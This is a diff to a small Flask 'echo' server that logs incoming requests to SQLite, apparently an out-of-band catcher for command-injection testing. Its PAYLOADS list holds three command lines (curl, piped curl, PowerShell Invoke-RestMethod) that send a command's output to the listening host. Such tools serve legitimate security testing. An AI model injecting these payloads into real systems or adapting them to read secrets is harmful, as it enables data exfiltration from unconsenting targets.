@@ -1,53 +1,29 @@
+from __future__ import annotations  # noqa: F404
 from flask import Flask, Request, request, render_template_string
 import datetime
 import sqlite3
 
-
-class EchoRecord:
-    request: Request
-    date: str
-    ip: str
-    data: str
-    headers: str
-
-
-# 修改下列 host 和 port 为你的主机地址和端口 以及 处理函数
+# configuration
 HOST = "0.0.0.0"
 PORT = 7413
 DB_FILE = "echout.db"
+LIMIT = 50
 
 
 def handle_record(record: EchoRecord):
     print(record)
 
 
-# end
+# configuration end
 
 
-# flask
-class EchoRecord:
-    def __init__(self, request):
-        self.request = request
-        self.date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        self.ip = request.remote_addr
-        self.data = request.get_data(as_text=True)
-        self.headers = self.build_http_headers(request)
-
-    def __str__(self):
-        return f"{self.date} | {self.ip}\n{self.headers}\n\n{self.data}"
-
-    def build_http_headers(self, request):
-        request_line = f"{request.method} {request.full_path.rstrip('?')} HTTP/1.1"
-        headers = "\r\n".join(f"{k}: {v}" for k, v in request.headers.items())
-        return f"{request_line}\r\n{headers}"
-
+# SOME
 
 PAYLOADS = [
     f"curl http://{HOST}:{PORT}/$(pwd)",
     f"pwd | curl --data-binary @- http://{HOST}:{PORT}/",
     f"pwd | powershell -Command \"Invoke-RestMethod -Uri 'http://{HOST}:{PORT}/' -Method POST -Body ([Console]::In.ReadToEnd())\"",
 ]
-
 
 TEMPLATE = """
 <!DOCTYPE html>
@@ -155,6 +131,60 @@ TEMPLATE = """
 </html>
 """
 
+
+# SOME end
+
+
+class EchoRecord:
+    request: Request
+    date: str
+    ip: str
+    data: str
+    headers: str
+
+    def __init__(self, request):
+        self.request = request
+        self.date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        self.ip = request.remote_addr
+        self.data = request.get_data(as_text=True)
+        self.headers = self.build_http_headers(request)
+
+    def __str__(self):
+        return f"{self.date} | {self.ip}\n{self.headers}\n\n{self.data}"
+
+    def build_http_headers(self, request):
+        request_line = f"{request.method} {request.full_path.rstrip('?')} HTTP/1.1"
+        headers = "\r\n".join(f"{k}: {v}" for k, v in request.headers.items())
+        return f"{request_line}\r\n{headers}"
+
+
+def init():
+    with sqlite3.connect(DB_FILE) as DB:
+        DB.execute(
+            "CREATE TABLE IF NOT EXISTS echouts (date TEXT, ip TEXT, data TEXT, headers TEXT)"
+        )
+        DB.commit()
+
+
+def query_records() -> list[EchoRecord]:
+    with sqlite3.connect(DB_FILE) as DB:
+        return DB.execute(
+            "SELECT * FROM echouts ORDER BY date  DESC LIMIT ?", (LIMIT,)
+        ).fetchall()
+
+
+def save_record(record: EchoRecord):
+    with sqlite3.connect(DB_FILE) as DB:
+        DB.execute(
+            "INSERT INTO echouts (date, ip, data, headers) VALUES (?, ?, ?, ?)",
+            (record.date, record.ip, record.data, record.headers),
+        )
+        DB.commit()
+
+
+# EchoRecord end
+
+# flask
 app = Flask(__name__)
 
 
@@ -173,7 +203,7 @@ def echo():
 
 
 @app.route("/<path:data>", methods=["GET"])
-def echo_data(data):
+def echo_path(data):
     er = EchoRecord(request)
     er.data = data
     save_record(er)
@@ -181,28 +211,9 @@ def echo_data(data):
     return "Ok"
 
 
-def query_records() -> list[EchoRecord]:
-    with sqlite3.connect(DB_FILE) as DB:
-        return DB.execute("SELECT * FROM echouts ORDER BY date DESC").fetchall()
+# flask end
 
-
-def save_record(record: EchoRecord):
-    with sqlite3.connect(DB_FILE) as DB:
-        DB.execute(
-            "INSERT INTO echouts (date, ip, data, headers) VALUES (?, ?, ?, ?)",
-            (record.date, record.ip, record.data, record.headers),
-        )
-        DB.commit()
-
-
-def init():
-    with sqlite3.connect(DB_FILE) as DB:
-        DB.execute(
-            "CREATE TABLE IF NOT EXISTS echouts (date TEXT, ip TEXT, data TEXT, headers TEXT)"
-        )
-        DB.commit()
-
-
+# run app
 if __name__ == "__main__":
     init()
     # init tables for db
